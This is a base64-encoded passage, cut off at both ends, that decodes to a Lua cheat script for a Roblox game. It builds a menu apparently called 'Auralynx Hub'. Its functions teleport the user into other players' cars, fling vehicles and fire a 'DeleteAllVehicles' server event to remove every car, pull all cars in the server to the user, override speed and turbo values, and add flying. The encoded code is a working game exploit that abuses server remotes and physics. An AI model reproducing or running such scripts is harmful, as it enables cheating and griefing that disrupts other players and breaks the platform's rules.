5kLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCB2ZWhpY2xlc0ZvbGRlciA9IFRlbGVwb3J0Q2Fycm8uV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlcyIpCiAgICAgICAgaWYgbm90IHZlaGljbGVzRm9sZGVyIHRoZW4KICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sVZlaGljbGUncyBmb2xkZXIgbm90IGZvdW5kLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBpc0ZhbGxEYW1hZ2VPZmYgPSBUZWxlcG9ydENhcnJvOlRvZ2dsZUZhbGxEYW1hZ2UodHJ1ZSkKICAgICAgICBsb2NhbCBjYXJzID0ge30KICAgICAgICBmb3IgXywgY2FyIGluIGlwYWlycyh2ZWhpY2xlc0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBjYXIuTmFtZTptYXRjaCgiQ2FyJCIpIHRoZW4KICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChjYXJzLCBjYXIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBmb3IgXywgY2FyIGluIGlwYWlycyhjYXJzKSBkbwogICAgICAgICAgICBsb2NhbCB2ZWhpY2xlU2VhdCA9IGNhcjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJWZWhpY2xlU2VhdCIsIHRydWUpCiAgICAgICAgICAgIGlmIHZlaGljbGVTZWF0IGFuZCB2ZWhpY2xlU2VhdC5PY2N1cGFudCA9PSBuaWwgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgc3VjY2VzcyA9IFRlbGVwb3J0Q2Fycm86VGVsZXBvcnRUb1NlYXQodmVoaWNsZVNlYXQsIGNhcikKICAgICAgICAgICAgICAgIGlmIHN1Y2Nlc3MgdGhlbgogICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0Q2Fycm86VGVsZXBvcnRUb1BsYXllcihjYXIsIG9yaWdpbmFsUG9zKQogICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0Q2Fycm86RXhpdENhckFuZFJldHVybihvcmlnaW5hbFBvcykKICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydENhcnJvOk1vc3RyYXJOb3RpZmljYWNhbygi4pqg77iP77ixVGhlIGNhcjogIiAuLiBjYXIuTmFtZSAuLiAiIHdhcyBiZWVuIHRlbGVwb3J0ZWQgdG8geW91LiIpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sUZhaWxlZCB0byBzaXQgb24gdGhlIGNhciAiIC4uIGNhci5OYW1lIC4uICIuIikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBpZiB2ZWhpY2xlU2VhdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKaoO+4j++4sUNhciAiIC4uIGNhci5OYW1lIC4uICIgaWdub3JlZDogc29tZW9uZSBzaXR0aW5nIGluIHRoZSBkcml2ZXIncyBzZWF0LiIpCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKaoO+4j++4sUNhciAiIC4uIGNhci5OYW1lIC4uICIgaWdub3JlZDogdmVoaWNsZSdzIHNlYXQgbm90IGZvdW5kLiIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIFRlbGVwb3J0Q2Fycm86VG9nZ2xlRmFsbERhbWFnZShmYWxzZSkKICAgICAgICBpZiAjY2FycyA9PSAwIHRoZW4KICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKaoO+4j++4sU5vIGNhciBmb3VuZC4iKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBNYW50ZXIgbyBlc3RhZG8gZGUgZGFubyBkZSBxdWVkYSBhbyByZWNhcnJlZ2FyIG8gcGVyc29uYWdlbQpsb2NhbCBmYWxsRGFtYWdlRGlzYWJsZWQgPSBmYWxzZQpUZWxlcG9ydENhcnJvLkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hhcmFjdGVyKQogICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCiAgICBpZiBmYWxsRGFtYWdlRGlzYWJsZWQgdGhlbgogICAgICAgIGh1bWFub2lkOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkZhbGxpbmdEb3duLCBmYWxzZSkKICAgICAgICBodW1hbm9pZDpTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5SYWdkb2xsLCBmYWxzZSkKICAgICAgICBodW1hbm9pZDpTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5HZXR0aW5nVXAsIHRydWUpCiAgICAgICAgaHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IGZhbHNlCiAgICBlbHNlCiAgICAgICAgaHVtYW5vaWQ6U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuRmFsbGluZ0Rvd24sIHRydWUpCiAgICAgICAgaHVtYW5vaWQ6U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuUmFnZG9sbCwgdHJ1ZSkKICAgIGVuZAplbmQpCgotLSBDb2xvcnMgZm9yIFJHQgpsb2NhbCBjb2xvcnMgPSB7CiAgICBDb2xvcjMubmV3KDEsIDAsIDApLCAgICAgLS0gUmVkCiAgICBDb2xvcjMubmV3KDAsIDEsIDApLCAgICAgLS0gR3JlZW4KICAgIENvbG9yMy5uZXcoMCwgMCwgMSksICAgICAtLSBCbHVlCiAgICBDb2xvcjMubmV3KDEsIDEsIDApLCAgICAgLS0gWWVsbG93CiAgICBDb2xvcjMubmV3KDEsIDAsIDEpLCAgICAgLS0gTWFnZW50YQogICAgQ29sb3IzLm5ldygwLCAxLCAxKSwgICAgIC0tIEN5YW4KICAgIENvbG9yMy5uZXcoMC41LCAwLCAwLjUpLCAtLSBQdXJwbGUKICAgIENvbG9yMy5uZXcoMSwgMC41LCAwKSAgICAtLSBPcmFuZ2UKfQoKLS0gUmVwbGljYXRlZCBTdG9yYWdlIFNlcnZpY2UKbG9jYWwgcmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKbG9jYWwgcmVtb3RlRXZlbnQgPSByZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxUGxheWVyMXNDYTFyIikKCi0tIFJHQiBDb2xvciBDaGFuZ2UgTG9naWMKbG9jYWwgaXNDb2xvckNoYW5naW5nID0gZmFsc2UKbG9jYWwgY29sb3JDaGFuZ2VDb3JvdXRpbmUgPSBuaWwKCmxvY2FsIGZ1bmN0aW9uIGNoYW5nZUNhckNvbG9yKCkKICAgIHdoaWxlIGlzQ29sb3JDaGFuZ2luZyBkbwogICAgICAgIGZvciBfLCBjb2xvciBpbiBpcGFpcnMoY29sb3JzKSBkbwogICAgICAgICAgICBpZiBub3QgaXNDb2xvckNoYW5naW5nIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdDYXJDb2xvciIsCiAgICAgICAgICAgICAgICBbMl0gPSBjb2xvcgogICAgICAgICAgICB9CiAgICAgICAgICAgIHJlbW90ZUV2ZW50OkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICB3YWl0KDEpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpDYXJUYWI6QWRkUGFyYWdyYXBoKHsi4pqg77iP77ixSW5mb3JtYXRpb246IiwgIkl0J3MgcmVjb21tZW5kZWQgdG8gdXNlIHRoaXMgdHdpY2UgdG8gZW5zdXJlIGFsbCB2ZWhpY2xlcyBhcmUgcmVtb3ZlZC4ifSkKCkNhclRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJSZW1vdmUgYWxsIGNhcnMiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgb2ZuYXd1Zm4gPSBmYWxzZQoKaWYgb2ZuYXd1Zm4gPT0gdHJ1ZSB0aGVuCiAgICByZXR1cm4KZW5kCm9mbmF3dWZuID0gdHJ1ZQoKbG9jYWwgY2F3d2ZlciA9ICJNaWxpdGFyeUJvYXRGcmVlIiAtLSBDaGFuZ2VkIHRvIE1pbGl0YXJ5Qm9hdEZyZWUKbG9jYWwgb2xkY2ZmZmZmID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQpnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygxNzU0LCAtMiwgNTgpIC0tIFVwZGF0ZWQgY29vcmRpbmF0ZXMKd2FpdCgwLjMpCgpsb2NhbCBhcmdzID0gewogICAgWzFdID0gIlBpY2tpbmdCb2F0IiwgLS0gQ2hhbmdlZCB0byBQaWNraW5nQm9hdAogICAgWzJdID0gY2F3d2Zlcgp9CgpnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFDYTFyIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCndhaXQoMSkKCmxvY2FsIHdyaW5mam4KZm9yIF8sIGVycmIgaW4gcGFpcnMoZ2FtZS53b3Jrc3BhY2UuVmVoaWNsZXNbZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUuLiJDYXIiXTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgaWYgZXJyYjpJc0EoIlZlaGljbGVTZWF0IikgdGhlbgogICAgICAgIHdyaW5mam4gPSBlcnJiCiAgICBlbmQKZW5kCgpyZXBlYXQKICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuSGVhbHRoID09IDAgdGhlbiByZXR1cm4gZW5kCiAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICBpZiBub3QgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TZWF0UGFydCA9PSB3cmluZmpuIHRoZW4KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gd3JpbmZqbi5DRnJhbWUKICAgIHRhc2sud2FpdCgpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gd3JpbmZqbi5DRnJhbWUgKyBWZWN0b3IzLm5ldygwLDEsMCkKICAgIHRhc2sud2FpdCgpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gd3JpbmZqbi5DRnJhbWUgKyBWZWN0b3IzLm5ldygwLC0xLDApCiAgICB0YXNrLndhaXQoKQp1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNlYXRQYXJ0ID09IHdyaW5mam4KCmZvciBfLCB3aWZuIGluIHBhaXJzKGdhbWUud29ya3NwYWNlLlZlaGljbGVzW2dhbWUuUGxheWVycy5Mb2NhbFBsYXllci5OYW1lLi4iQ2FyIl06R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgIGlmIHdpZm4uTmFtZSA9PSAiUGh5c2ljYWxXaGVlbCIgdGhlbgogICAgICAgIHdpZm46RGVzdHJveSgpCiAgICBlbmQKZW5kCgpsb2NhbCBGTElOR0VEID0gSW5zdGFuY2UubmV3KCJCb2R5VGhydXN0IiwgZ2FtZS53b3Jrc3BhY2UuVmVoaWNsZXNbZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUuLiJDYXIiXS5DaGFzc2lzLk1hc3MpIApGTElOR0VELkZvcmNlID0gVmVjdG9yMy5uZXcoNTAwMDAsIDAsIDUwMDAwKSAKRkxJTkdFRC5OYW1lID0gIkZMSU5HIgpGTElOR0VELkxvY2F0aW9uID0gZ2FtZS53b3Jrc3BhY2UuVmVoaWNsZXNbZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUuLiJDYXIiXS5DaGFzc2lzLk1hc3MuUG9zaXRpb24KCmZvciBfLCB3dnd2d2FzYyBpbiBwYWlycyhnYW1lLndvcmtzcGFjZS5WZWhpY2xlczpHZXRDaGlsZHJlbigpKSBkbwogICAgZm9yIF8sIGFzY2VnciBpbiBwYWlycyh3dnd2d2FzYzpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgIGlmIGFzY2Vnci5OYW1lID09ICJWZWhpY2xlU2VhdCIgdGhlbgogICAgICAgICAgICBsb2NhbCB0YXJnZXRjYXIgPSBhc2NlZ3IKICAgICAgICAgICAgbG9jYWwgdGV0ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiLCBnYW1lLndvcmtzcGFjZS5WZWhpY2xlc1tnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZS4uIkNhciJdLkNoYXNzaXMuTWFzcykKICAgICAgICAgICAgdGV0Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLG1hdGguaHVnZSxtYXRoLmh1Z2UpCiAgICAgICAgICAgIHRldC5QID0gMTI1MAogICAgICAgICAgICB0ZXQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKICAgICAgICAgICAgdGV0Lk5hbWUgPSAiI21PVk9PRVBGJCNARiQjR0VSRS4uPlY8PDw8RVc8Vjw8VyIKICAgICAgICAgICAgZm9yIG09MSwyNSBkbwogICAgICAgICAgICAgICAgbG9jYWwgcG9zID0ge3g9MCwgeT0wLCB6PTB9CiAgICAgICAgICAgICAgICBwb3MueCA9IHRhcmdldGNhci5Qb3NpdGlvbi5YCiAgICAgICAgICAgICAgICBwb3MueSA9IHRhcmdldGNhci5Qb3NpdGlvbi5ZCiAgICAgICAgICAgICAgICBwb3MueiA9IHRhcmdldGNhci5Qb3NpdGlvbi5aCiAgICAgICAgICAgICAgICBwb3MueCA9IHBvcy54ICsgdGFyZ2V0Y2FyLlZlbG9jaXR5LlggLyAyCiAgICAgICAgICAgICAgICBwb3MueSA9IHBvcy55ICsgdGFyZ2V0Y2FyLlZlbG9jaXR5LlkgLyAyCiAgICAgICAgICAgICAgICBwb3MueiA9IHBvcy56ICsgdGFyZ2V0Y2FyLlZlbG9jaXR5LlogLyAyCiAgICAgICAgICAgICAgICBpZiBwb3MueSA8PSAtMjAwIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lLndvcmtzcGFjZS5WZWhpY2xlc1tnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZS4uIkNhciJdLkNoYXNzaXMuTWFzcy5DRnJhbWUgPSBDRnJhbWUubmV3KDAsMTAwMCwwKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGdhbWUud29ya3NwYWNlLlZlaGljbGVzW2dhbWUuUGxheWVycy5Mb2NhbFBsYXllci5OYW1lLi4iQ2FyIl0uQ2hhc3Npcy5NYXNzLkNGcmFtZSA9IENGcmFtZS5uZXcoVmVjdG9yMy5uZXcocG9zLngscG9zLnkscG9zLnopKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgZ2FtZS53b3Jrc3BhY2UuVmVoaWNsZXNbZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUuLiJDYXIiXS5DaGFzc2lzLk1hc3MuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldyhwb3MueCxwb3MueSxwb3MueikpICsgVmVjdG9yMy5uZXcoMCwtMiwwKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgZ2FtZS53b3Jrc3BhY2UuVmVoaWNsZXNbZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUuLiJDYXIiXS5DaGFzc2lzLk1hc3MuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldyhwb3MueCxwb3MueSxwb3MueikpICogQ0ZyYW1lLm5ldygwLDAsMikKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgIGdhbWUud29ya3NwYWNlLlZlaGljbGVzWwpnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZS4uIkNhciJdLkNoYXNzaXMuTWFzcy5DRnJhbWUgPSBDRnJhbWUubmV3KFZlY3RvcjMubmV3KHBvcy54LHBvcy55LHBvcy56KSkgKiBDRnJhbWUubmV3KDIsMCwwKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZAoKdGFzay53YWl0KCkKbG9jYWwgYXJncyA9IHsKICAgIFsxXSA9ICJEZWxldGVBbGxWZWhpY2xlcyIKfQoKZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxQ2ExciIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQpnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCndhaXQoKQpsb2NhbCB0ZXQgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydCkKdGV0Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLG1hdGguaHVnZSxtYXRoLmh1Z2UpCnRldC5QID0gMTI1MAp0ZXQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKdGV0Lk5hbWUgPSAiI21PVk9PRVBGJCNARiQjR0VSRS4uPlY8PDw8RVc8Vjw8VyIKd2FpdCgwLjEpCmZvciBtPTEsMiBkbyAKICAgIHRhc2sud2FpdCgpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb2xkY2ZmZmZmCmVuZAp3YWl0KDEpCmdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZmZmZmYKd2FpdCgpCmdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydDpGaW5kRmlyc3RDaGlsZCgiI21PVk9PRVBGJCNARiQjR0VSRS4uPlY8PDw8RVc8Vjw8VyIpOkRlc3Ryb3koKQp3YWl0KDAuMikKb2ZuYXd1Zm4gPSBmYWxzZQogICAgZW5kCn0pCgoKQ2FyVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkJyaW5nIGFsbCBDYXJzIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGZvciBfLCB2IGluIG5leHQsIHdvcmtzcGFjZS5WZWhpY2xlczpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgIHY6U2V0UHJpbWFyeVBhcnRDRnJhbWUoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXRQcmltYXJ5UGFydENGcmFtZSgpKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpDYXJUYWI6QWRkUGFyYWdyYXBoKHsi4pqg77iP77ixSW5mb3JtYXRpb246IiwgIkJyaW5nIGFsbCBjYXJzIGluIHRoZSBzZXJ2ZXIgdG8geW91LiJ9KQoKLS0gU3BlZWQgVjEgU2VjdGlvbgpsb2NhbCBTcGVlZFNlY3Rpb24gPSBDYXJUYWI6QWRkU2VjdGlvbih7IvCfmpfvuLFTcGVlZCJ9KQoKbG9jYWwgU3BlZWQgPSA1MApsb2NhbCBUdXJibyA9IDUwCgpsb2NhbCBmdW5jdGlvbiBDaGFuZ2VDYXJTcGVlZEFuZFR1cmJvKHNwZWVkVmFsdWUsIHR1cmJvVmFsdWUpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNhciA9IHdvcmtzcGFjZS5WZWhpY2xlczpGaW5kRmlyc3RDaGlsZChwbGF5ZXIuTmFtZSAuLiAiQ2FyIikKCiAgICBpZiBjYXIgdGhlbgogICAgICAgIGxvY2FsIGJvZHkgPSBjYXI6RmluZEZpcnN0Q2hpbGQoIkJvZHkiKS5WZWhpY2xlU2VhdAogICAgICAgIGlmIGJvZHkgdGhlbgogICAgICAgICAgICBib2R5LlRvcFNwZWVkLlZhbHVlID0gc3BlZWRWYWx1ZQogICAgICAgICAgICBib2R5LlR1cmJvLlZhbHVlID0gdHVyYm9WYWx1ZQogICAgICAgICAgICB3YWl0KDAuMSkKICAgICAgICAgICAgTGliYXJ5Ok1ha2VOb3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgTmFtZSA9ICJBdXJhbHlueCBIdWIiLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICLinIXvuLFEb25lLCB5b3UgY2FuIG1vdmUgbm93LiIsCiAgICAgICAgICAgICAgICBUaW1lID0gNQogICAgICAgICAgICB9KQogICAgICAgIGVsc2UKICAgICAgICAgICAgTGliYXJ5Ok1ha2VOb3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgTmFtZSA9ICLinYzvuLFFcnJvcjoiLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICLimqDvuI/vuLFTaXQgaW4gY2FyIGZpcnN0LiIsCiAgICAgICAgICAgICAgICBUaW1lID0gNQogICAgICAgICAgICB9KQogICAgICAgIGVuZAogICAgZWxzZQogICAgICAgIExpYmFyeTpNYWtlTm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgTmFtZSA9ICLinYzvuLFFcnJvcjoiLAogICAgICAgICAgICBDb250ZW50ID0gIuKaoO+4j++4sVB1dCBhIENhciBGaXJzdC4iLAogICAgICAgICAgICBUaW1lID0gNQogICAgICAgIH0pCiAgICBlbmQKZW5kCgpDYXJUYWI6QWRkVGV4dEJveCh7CiAgICBOYW1lID0gIlNwZWVkOiIsCiAgICBQbGFjZWhvbGRlclRleHQgPSAiSW5zZXJ0IHZhbHVlIGhlcmUuLi4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBsb2NhbCBuZXdTcGVlZCA9IHRvbnVtYmVyKHZhbHVlKQogICAgICAgIGlmIG5ld1NwZWVkIHRoZW4KICAgICAgICAgICAgU3BlZWQgPSBuZXdTcGVlZAogICAgICAgIGVuZAogICAgZW5kCn0pCgpDYXJUYWI6QWRkVGV4dEJveCh7CiAgICBOYW1lID0gIlR1cmJvOiIsCiAgICBQbGFjZWhvbGRlclRleHQgPSAiSW5zZXJ0IHZhbHVlIGhlcmUuLi4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBsb2NhbCBuZXdUdXJibyA9IHRvbnVtYmVyKHZhbHVlKQogICAgICAgIGlmIG5ld1R1cmJvIHRoZW4KICAgICAgICAgICAgVHVyYm8gPSBuZXdUdXJibwogICAgICAgIGVuZAogICAgZW5kCn0pCgpDYXJUYWI6QWRkVGV4dEJveCh7CiAgICBOYW1lID0gIkRyaWZ0OiIsCiAgICBQbGFjZWhvbGRlclRleHQgPSAiSW5zZXJ0IHZhbHVlIGhlcmUuLi4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICBbMV0gPSAiRHJpZnRpbmdOdW1iZXIiLAogICAgICAgICAgICBbMl0gPSB2YWx1ZQogICAgICAgIH0KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFQbGF5ZXIxc0NhMXIiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIGVuZAp9KQoKQ2FyVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkFwcGx5IGFsbCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBDaGFuZ2VDYXJTcGVlZEFuZFR1cmJvKFNwZWVkLCBUdXJibykKICAgIGVuZAp9KQoKLS0gVHVyYm8gVjIgU2VjdGlvbgpsb2NhbCBUdXJib1NlY3Rpb24gPSBDYXJUYWI6QWRkU2VjdGlvbih7IvCfmoDvuLFUdXJibyJ9KQoKQ2FyVGFiOkFkZFBhcmFncmFwaCh7IuKaoO+4j++4sUluZm9ybWF0aW9uOiIsICJCb3RoIHR1cmJvcyBkbyBub3QgcmVxdWlyZSBhIEdhbWVwYXNzLiJ9KQoKQ2FyVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIlR1cmJvIDIuMCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCmxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoKbG9jYWwgZmx5aW5nID0gZmFsc2UKbG9jYWwgc3BlZWQgPSAzMAoKbG9jYWwgc2NyZWVuR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiLCBwbGF5ZXIuUGxheWVyR3VpKQoKbG9jYWwgZnVuY3Rpb24gY3JlYXRlSW1hZ2VCdXR0b24obmFtZSwgcG9zaXRpb24sIGltYWdlSWQsIHJvdGF0aW9uLCBhY3Rpb24pCiAgICBsb2NhbCBidXR0b24gPSBJbnN0YW5jZS5uZXcoIkltYWdlQnV0dG9uIiwgc2NyZWVuR3VpKQogICAgYnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMCwgNjAsIDAsIDYwKQogICAgYnV0dG9uLlBvc2l0aW9uID0gcG9zaXRpb24KICAgIGJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgYnV0dG9uLkltYWdlID0gInJieGFzc2V0aWQ6Ly8iIC4uIGltYWdlSWQKICAgIGJ1dHRvbi5Sb3RhdGlvbiA9IHJvdGF0aW9uCiAgICBidXR0b24uTW91c2VCdXR0b24xRG93bjpDb25uZWN0KGFjdGlvbikKICAgIHJldHVybiBidXR0b24KZW5kCgpsb2NhbCBmb3J3YXJkQnV0dG9uID0gY3JlYXRlSW1hZ2VCdXR0b24oIkZvcndhcmRCdXR0b24iLCBVRGltMi5uZXcoMCwgMTAsIDAuMzUsIDApLCAiMTg0NzgyNDk2MDYiLCAwLCBmdW5jdGlvbigpCiAgICBmbHlpbmcgPSB0cnVlCiAgICB3aGlsZSBmbHlpbmcgZG8KICAgICAgICBpZiBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5WZWxvY2l0eSA9IGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lLkxvb2tWZWN0b3IgKiBzcGVlZAogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgpCiAgICBlbmQKZW5kKQoKbG9jYWwgYmFja0J1dHRvbiA9IGNyZWF0ZUltYWdlQnV0dG9uKCJCYWNrQnV0dG9uIiwgVURpbTIubmV3KDAsIDEwLCAwLjUsIDApLCAiMTg0N